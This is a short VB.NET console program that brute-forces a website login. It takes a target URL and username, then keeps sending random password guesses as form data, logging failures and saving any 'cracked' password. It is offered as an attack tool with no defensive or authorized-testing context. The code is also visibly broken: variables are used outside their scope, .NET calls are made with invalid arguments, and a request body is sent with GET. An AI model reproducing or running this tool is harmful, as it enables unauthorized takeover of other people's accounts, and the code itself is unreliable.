Imports System.Diagnostics
Imports System.Net
Imports System.Threading
Imports System.IO

Module Module1
    Sub Main()
        Dim passwordfile As StreamReader = New StreamReader("password.txt")
        Dim url As String = Console.ReadLine("$: Url : ")
        Dim username As String = Console.ReadLine("$: UserName / Mail / PhoneNumber : ")
        Dim chars As String = passwordfile.ReadToEnd()
        passwordfile.Close()
        While True
            Dim response As HttpWebResponse = DirectCast(WebRequest.Create(url).GetResponse(), HttpWebResponse)
            If File.Exists("correct_pass.txt") Then
                Exit While
            End If
            Dim valid As Boolean = False
            While Not valid
                Dim rndpasswd As String = ""
                For i As Integer = 1 To 2
                    rndpasswd &= chars(Random.Next(0, chars.Length))
                Next
                Dim file As StreamReader = New StreamReader("tries.txt")
                Dim tries As String = file.ReadToEnd()
                file.Close()
                If tries.Contains(rndpasswd) Then
                    Continue While
                Else
                    valid = True
                End If
            End While
            Dim r As HttpWebResponse = send_request(username, rndpasswd)
            If response.StatusCode = HttpStatusCode.Unauthorized Then
                If r.GetResponseStream().ToString().ToLower().Contains("failed to login") Then
                    Using f As StreamWriter = New StreamWriter("tries.txt", True)
                        f.WriteLine(rndpasswd)
                    End Using
                    Console.WriteLine("*:Incorrect " & rndpasswd)
                Else
                    Console.WriteLine("*:Cracking Password ...")
                    Using f As StreamWriter = New StreamWriter("correct_pass.txt")
                        f.WriteLine(rndpasswd)
                    End Using
                    Console.WriteLine("correct_pass.txt", "r")
                    If response.StatusCode = HttpStatusCode.OK Then
                        Console.WriteLine("Password Cracked !")
                        Exit While
                    End If
                End If
            End If
        End While
    End Sub

    Function send_request(username As String, password As String) As HttpWebResponse
        Dim request As HttpWebRequest = DirectCast(WebRequest.Create(url), HttpWebRequest)
        request.Method = "GET"
        Dim data As String = "username=" & username & "&password=" & password
        Dim byteArray As Byte() = Encoding.UTF8.GetBytes(data)
        request.ContentType = "application/x-www-form-urlencoded"
        request.ContentLength = byteArray.Length
        Dim dataStream As Stream = request.GetRequestStream()
        dataStream.Write(byteArray, 0, byteArray.Length)
        dataStream.Close()
        Return DirectCast(request.GetResponse(), HttpWebResponse)
    End Function
End Module

